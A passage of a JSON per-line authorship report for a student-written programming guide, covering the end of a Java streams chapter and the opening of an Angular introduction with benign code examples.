          "gitId": "-"
        },
        "content": "List\u003cString\u003e averageCap \u003d students.stream()"
      },
      {
        "lineNumber": 312,
        "author": {
          "gitId": "-"
        },
        "content": "                                  .collect(Collectors.averagingDouble(Student::getCap));"
      },
      {
        "lineNumber": 313,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 314,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 315,
        "author": {
          "gitId": "-"
        },
        "content": "Suppose you want lists of students according to their current year of study. You can use `Collectors.groupingBy(Function\u003c? super T,? extends K\u003e classifier)` and provide the classifier which returns the year of study of a student. This returns a `Map\u003cInteger, List\u003cStudent\u003e\u003e` object where the result of the classifier for an element would be one of the key values of the `Map`."
      },
      {
        "lineNumber": 316,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 317,
        "author": {
          "gitId": "-"
        },
        "content": "Map\u003cInteger, List\u003cStudent\u003e\u003e studentsByYear \u003d students.stream()"
      },
      {
        "lineNumber": 318,
        "author": {
          "gitId": "-"
        },
        "content": "                                            .collect(Collectors.groupingBy(Student::getYear));"
      },
      {
        "lineNumber": 319,
        "author": {
          "gitId": "-"
        },
        "content": "List\u003cStudent\u003e firstYears \u003d studentsByYear.get(1);"
      },
      {
        "lineNumber": 320,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 321,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 322,
        "author": {
          "gitId": "-"
        },
        "content": "### Drawbacks and Pitfalls"
      },
      {
        "lineNumber": 323,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 324,
        "author": {
          "gitId": "-"
        },
        "content": "In order to effectively utilise streams, one would also need to know the common drawbacks and pitfalls associated with streams. In this section, we will talk about two common pitfalls and how you can avoid them."
      },
      {
        "lineNumber": 325,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 326,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Long, Complicated Lambda Expressions"
      },
      {
        "lineNumber": 327,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 328,
        "author": {
          "gitId": "-"
        },
        "content": "Lambda expressions allow us, as developers, to define a function quickly and easily. However, this power can be easily abused, and one might write a long, complicated lambda expression when trying to provide the required functional interface for the stream operation, resulting in code like this:"
      },
      {
        "lineNumber": 329,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 330,
        "author": {
          "gitId": "-"
        },
        "content": "result \u003d futures.stream()"
      },
      {
        "lineNumber": 331,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(HttpService::getFutureValue)"
      },
      {
        "lineNumber": 332,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(failureOrResponse -\u003e {"
      },
      {
        "lineNumber": 333,
        "author": {
          "gitId": "-"
        },
        "content": "                    return failureOrResponse"
      },
      {
        "lineNumber": 334,
        "author": {
          "gitId": "-"
        },
        "content": "                          .right().flatMap(this::parseResponse);"
      },
      {
        "lineNumber": 335,
        "author": {
          "gitId": "-"
        },
        "content": "                })"
      },
      {
        "lineNumber": 336,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(failureOrResult -\u003e {"
      },
      {
        "lineNumber": 337,
        "author": {
          "gitId": "-"
        },
        "content": "                    return failureOrResult.either("
      },
      {
        "lineNumber": 338,
        "author": {
          "gitId": "-"
        },
        "content": "                            failure -\u003e {"
      },
      {
        "lineNumber": 339,
        "author": {
          "gitId": "-"
        },
        "content": "                                log.warn(failure.getMessage());"
      },
      {
        "lineNumber": 340,
        "author": {
          "gitId": "-"
        },
        "content": "                                return EMPTY_RESULT;"
      },
      {
        "lineNumber": 341,
        "author": {
          "gitId": "-"
        },
        "content": "                            },"
      },
      {
        "lineNumber": 342,
        "author": {
          "gitId": "-"
        },
        "content": "                            result -\u003e {"
      },
      {
        "lineNumber": 343,
        "author": {
          "gitId": "-"
        },
        "content": "                                return result;"
      },
      {
        "lineNumber": 344,
        "author": {
          "gitId": "-"
        },
        "content": "                            });"
      },
      {
        "lineNumber": 345,
        "author": {
          "gitId": "-"
        },
        "content": "                })"
      },
      {
        "lineNumber": 346,
        "author": {
          "gitId": "-"
        },
        "content": "                .reduce(EMPTY_RESULT, Result::union);"
      },
      {
        "lineNumber": 347,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 348,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 349,
        "author": {
          "gitId": "-"
        },
        "content": "(adapted from https://www.reddit.com/r/java/comments/2x47wy/java_8_code_style/)"
      },
      {
        "lineNumber": 350,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 351,
        "author": {
          "gitId": "-"
        },
        "content": "Such code is not only hard to read but also hard to maintain. The general guideline is that __lambda expressions should only be one line long__. If it cannot fit within a single line, the lambda expression is probably not easy to read for people who aren\u0027t the author. The code will be much more readable if such lambdas are extracted as methods and this extraction can be easily done with a few clicks in many IDEs such as Eclipse or IntelliJ."
      },
      {
        "lineNumber": 352,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 353,
        "author": {
          "gitId": "-"
        },
        "content": "With the lambda expressions extracted as methods `getFailureOrResult` and `getEmptyResultIfFailure`, the earlier code example can be simplified to look like this:"
      },
      {
        "lineNumber": 354,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 355,
        "author": {
          "gitId": "-"
        },
        "content": "result \u003d futures.stream()"
      },
      {
        "lineNumber": 356,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(HttpService::getFutureValue)"
      },
      {
        "lineNumber": 357,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(this::getFailureOrResult)"
      },
      {
        "lineNumber": 358,
        "author": {
          "gitId": "-"
        },
        "content": "                .map(this::getEmptyResultIfFailure)"
      },
      {
        "lineNumber": 359,
        "author": {
          "gitId": "-"
        },
        "content": "                .reduce(EMPTY_RESULT, Result::union);"
      },
      {
        "lineNumber": 360,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 361,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 362,
        "author": {
          "gitId": "-"
        },
        "content": "With good method names given to the extracted lambda expressions, the code for the stream operation becomes self-documenting again."
      },
      {
        "lineNumber": 363,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 364,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Difficulty in Optimising Stream Performance"
      },
      {
        "lineNumber": 365,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 366,
        "author": {
          "gitId": "-"
        },
        "content": "Performance is undeniably an important aspect in programming. So you might wonder if the performance of Stream is comparable to loops or how much performance gain can you get with parallel streams. According to [this blog post](http://blog.takipi.com/benchmark-how-java-8-lambdas-and-streams-can-make-your-code-5-times-slower/), an simple implementation using stream can be about 4 times slower than using a traditional loop, even when the stream was parallelised. The performance of streams was eventually improved with some optimisation and the difference in performance between loops and streams was reduced to a negligible amount. However, this example serves as a reminder that writing a efficient stream pipeline is no easy task."
      },
      {
        "lineNumber": 367,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 368,
        "author": {
          "gitId": "-"
        },
        "content": "Loops are one of the most common control flow structures we use and many of us would probably have a relatively good idea of what are the things you should avoid in loops to achieve good performance. However, this is not the case with streams. As streams have a more high-level abstraction, it is more difficult to understand what is going on beneath our code. Streams are fairly new compared to loops and the unfamiliarity with streams is also another factor which adds on to the difficulty in optimising stream performance."
      },
      {
        "lineNumber": 369,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 370,
        "author": {
          "gitId": "-"
        },
        "content": "Oftentimes, __using streams to give us better readability and reduced development time while compromising some performance is a reasonable bargain__. We don\u0027t spend our time optimising each line of code for a small improvement in performance when we can be doing more productive things."
      },
      {
        "lineNumber": 371,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 372,
        "author": {
          "gitId": "-"
        },
        "content": "However, when the application is __performance-critical__, knowing that streams can possibly run much slower than a traditional loop, it is good to __benchmark and test the performance of the stream code__. To understand more about how streams are processed and how one can optimise a stream pipeline, you may want to look at [third](https://www.ibm.com/developerworks/library/j-java-streams-3-brian-goetz/index.html), [fourth](https://www.ibm.com/developerworks/java/library/j-java-streams-4-brian-goetz/index.html) and [fifth](https://www.ibm.com/developerworks/java/library/j-java-streams-5-brian-goetz/index.html) part of Brian Goetz\u0027s tutorial."
      },
      {
        "lineNumber": 373,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 374,
        "author": {
          "gitId": "-"
        },
        "content": "## Resources"
      },
      {
        "lineNumber": 375,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 376,
        "author": {
          "gitId": "-"
        },
        "content": "Hopefully through this guide, you are able to get a good understanding on what are streams and how you can use it. Below are resources you may want to look at to learn more about each respective topic."
      },
      {
        "lineNumber": 377,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 378,
        "author": {
          "gitId": "-"
        },
        "content": "### Functional Interfaces"
      },
      {
        "lineNumber": 379,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 380,
        "author": {
          "gitId": "-"
        },
        "content": "* https://dzone.com/articles/introduction-functional-1  "
      },
      {
        "lineNumber": 381,
        "author": {
          "gitId": "-"
        },
        "content": "The article provides the background understanding of functional interfaces and links to other blog posts to understand more about functional interfaces."
      },
      {
        "lineNumber": 382,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 383,
        "author": {
          "gitId": "-"
        },
        "content": "### Method References"
      },
      {
        "lineNumber": 384,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 385,
        "author": {
          "gitId": "-"
        },
        "content": "* https://docs.oracle.com/javase/tutorial/java/javaOO/methodreferences.html   "
      },
      {
        "lineNumber": 386,
        "author": {
          "gitId": "-"
        },
        "content": "Provides a good summary and short examples of how each kind of method reference can be used."
      },
      {
        "lineNumber": 387,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 388,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.codementor.io/eh3rrera/using-java-8-method-reference-du10866vx  "
      },
      {
        "lineNumber": 389,
        "author": {
          "gitId": "-"
        },
        "content": "Read this to get a good understanding of how each method reference is translated to a functional interface object."
      },
      {
        "lineNumber": 390,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 391,
        "author": {
          "gitId": "-"
        },
        "content": "### Lambda Expressions"
      },
      {
        "lineNumber": 392,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 393,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://www.lambdafaq.org/  "
      },
      {
        "lineNumber": 394,
        "author": {
          "gitId": "-"
        },
        "content": "A helpful reference and tutorial on functional-style programming in Java. Explanations given are concise and easy to understand."
      },
      {
        "lineNumber": 395,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 396,
        "author": {
          "gitId": "-"
        },
        "content": "* https://docs.oracle.com/javase/tutorial/java/javaOO/lambdaexpressions.html  "
      },
      {
        "lineNumber": 397,
        "author": {
          "gitId": "-"
        },
        "content": "Read this to understand more about the use cases for lambda expressions."
      },
      {
        "lineNumber": 398,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 399,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* https://www.informit.com/articles/article.aspx?p\u003d2303960\u0026seqNum\u003d7  "
      },
      {
        "lineNumber": 400,
        "author": {
          "gitId": "-"
        },
        "content": "The article is from a book, Core Java for the Impatient, and talks about the scoping of lambda expressions and what you can or cannot do with variables belonging to the enclosing scope."
      },
      {
        "lineNumber": 401,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 402,
        "author": {
          "gitId": "-"
        },
        "content": "### Stream"
      },
      {
        "lineNumber": 403,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 404,
        "author": {
          "gitId": "-"
        },
        "content": "* https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html  "
      },
      {
        "lineNumber": 405,
        "author": {
          "gitId": "-"
        },
        "content": "Gives a good overview on Streams and how it should be used."
      },
      {
        "lineNumber": 406,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 407,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 408,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.ibm.com/developerworks/library/j-java-streams-1-brian-goetz/index.html"
      },
      {
        "lineNumber": 409,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.ibm.com/developerworks/library/j-java-streams-2-brian-goetz/index.html"
      },
      {
        "lineNumber": 410,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.ibm.com/developerworks/library/j-java-streams-3-brian-goetz/index.html"
      },
      {
        "lineNumber": 411,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.ibm.com/developerworks/java/library/j-java-streams-4-brian-goetz/index.html"
      },
      {
        "lineNumber": 412,
        "author": {
          "gitId": "-"
        },
        "content": "* https://www.ibm.com/developerworks/java/library/j-java-streams-5-brian-goetz/index.html  "
      },
      {
        "lineNumber": 413,
        "author": {
          "gitId": "-"
        },
        "content": "The five-part tutorial by Brian Goetz gives a complete guide on how to work with Stream, with the basic operations in the first part, reducing and collecting in the second part, understanding how streams are processed in the third part, and how to optimize parallel operations in the fourth and fifth part."
      },
      {
        "lineNumber": 414,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 415,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Common Pitfalls"
      },
      {
        "lineNumber": 416,
        "author": {
          "gitId": "-"
        },
        "content": "* https://blog.jooq.org/2014/06/13/java-8-friday-10-subtle-mistakes-when-using-the-streams-api/  "
      },
      {
        "lineNumber": 417,
        "author": {
          "gitId": "-"
        },
        "content": "The article gives a list of other common mistakes one may make when using streams."
      },
      {
        "lineNumber": 418,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 419,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 3,
      "iskandarzulkarnaien": 28,
      "-": 384
    }
  },
  {
    "path": "contents/javascript/Javascript-framework-Angular.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Angular"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Angular"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Author: [Ronak Lakhotia](https://github.com/RonakLakhotia)**                                                              "
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Tan Heng Yeow](https://github.com/tanhengyeow), [Jacob Li PengCheng](https://github.com/jacoblipech)"
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "## What is Angular?"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "The [official website](https://angular.io/docs) describes Angular as follows:"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "\u003e*Angular* is a platform that makes it easy to build applications with the web. Angular combines declarative templates, dependency injection, end to end tooling, and integrated best practices to solve development challenges. Angular empowers developers to build applications that live on the web, mobile, or the desktop."
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "Let us understand some key terms in that definition starting with _declarative templates_."
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "### Declarative Templates and Components"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "Consider a simple web application that displays the name of a person as shown below."
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ciframe src\u003d\"https://stackblitz.com/edit/angular-3qy4j2?embed\u003d1\u0026file\u003dsrc/app/app.component.ts\u0026view\u003dpreview\" style\u003d\"width:85%; height:380px; border:0; border-radius: 4px; overflow:hidden;\" sandbox\u003d\"allow-modals allow-forms allow-popups allow-scripts allow-same-origin\"\u003e\u003c/iframe\u003e "
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox type\u003d\"info\"\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "    The sandbox allows you to edit the code of the web application. You can enter your name in the text box and see how the UI is automatically updated. You can also view and edit the code by clicking on the \"Both\" button. "
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "The UI of an Angular app is defined in _templates_ which contain a mix of HTML code and HTML-like [custom tags](https://angular.io/guide/elements). The template for the above example (defined in `person.component.html`) is given below:"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "``` html"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ch1\u003eAbout Me!\u003c/h1\u003e"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ch2\u003eHello World! My name is {person.name}\u003c/h2\u003e"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv\u003e"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "\u003clabel\u003eNAME: \u003cinput [(ngModel)]\u003d\"person.name\"/\u003e\u003c/label\u003e"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "The templates used in Angular are _declarative_ because they describe _what_ the view should look like rather than give instructions on _how_ to construct the view. In the above example, we declare what we want to display (i.e., name) and Angular renders the view. A noteworthy feature about the UI rendered by Angular is its _dynamic behavior_."
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "You will notice that as you change the name in the text box, the name rendered on the app is also updated. This is because the UI and the application data are automatically synchronized by Angular as explained [here](https://angular.io/guide/template-syntax#binding-syntax-an-overview)."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Angular organizes the instructions (written in _TypeScript_) that describe _how_ the view must rendered, into _Components_. Given below is the component file `person.component.ts` of the `PersonComponent` :  "
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```typescript"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "@Component({"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "  selector: \u0027app-person\u0027,"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "  templateUrl: \u0027./person.component.html\u0027,"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "  styleUrls: [\u0027./person.component.css\u0027]"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "})"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "export class PersonComponent {"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "  person: Person \u003d {"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "    name: \u0027John Doe\u0027"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "  };"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "  constructor() { }"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "The `@Component` tag is used to mark a component. It provides the metadata that determines how the component is processed during runtime."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "* The use of `selector: app-person` is how Angular identifies this component in a template. This is an example of a custom tag used in Angular templates. The following code constitutes the template of `app.component.html`."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "    ```html"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003ch1\u003ePerson Data\u003c/h1\u003e"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003capp-person\u003e\u003c/app-person\u003e"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "    \u003chr/\u003e"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "    ```"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "    Angular identifies the `\u003capp-person\u003e` tag, instantiates the `PersonComponent` and renders the view defined by the template `./person.component.html`."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "* The `person.name` used in the template `./person.component.html`, refers to the name property defined in the above component."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "### Dependency Injection"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "Now let us look at what _Dependency Injection_ (DI) means. Dependencies are _services_ that a class needs in order to perform its function. We can visualize this with the help of an example."
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ccenter\u003e"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"dependency.png\" width\u003d\"60%\"\u003e"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "_Figure 1. What is a dependency?_ (source: [freecodecamp](https://medium.freecodecamp.org/a-quick-intro-to-dependency-injection-what-it-is-and-when-to-use-it-7578c84fa88f))"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/center\u003e"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "Dependency injection is a way of providing a class with the required services. Given below is an injectable service class."
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "```typescript"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "import { Injectable } from \u0027@angular/core\u0027;"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "import { PERSONS } from \u0027./mock-persons\u0027;"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "@Injectable({"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "  providedIn: \u0027root\u0027,"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "})"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "export class PersonService {"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  getPersons() { return PERSONS; }"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "The `PersonComponent` declared previously, can make use of this `PersonService` by injecting the dependency in its constructor as a parameter."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "constructor(personService: PersonService) {"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": " this.persons \u003d personService.getPersons();"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "In the above example, we write the `getPersons` method only once in the service class and we can access this method from any component by injecting the service in the constructor."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "This way of using DI increases the efficiency and modularity (as per the [Angular official website](https://angular.io/guide/dependency-injection))."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "Declarative Templates and Dependency Injection are only a couple of noteworthy features of Angular. A more comprehensive [list](https://angular.io/features) is available on the official website. "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": " "
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Why Use Angular?"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Now that we know what Angular is, let us look at some benefits it has to offer."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Benefit 1: Good Tooling Services"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
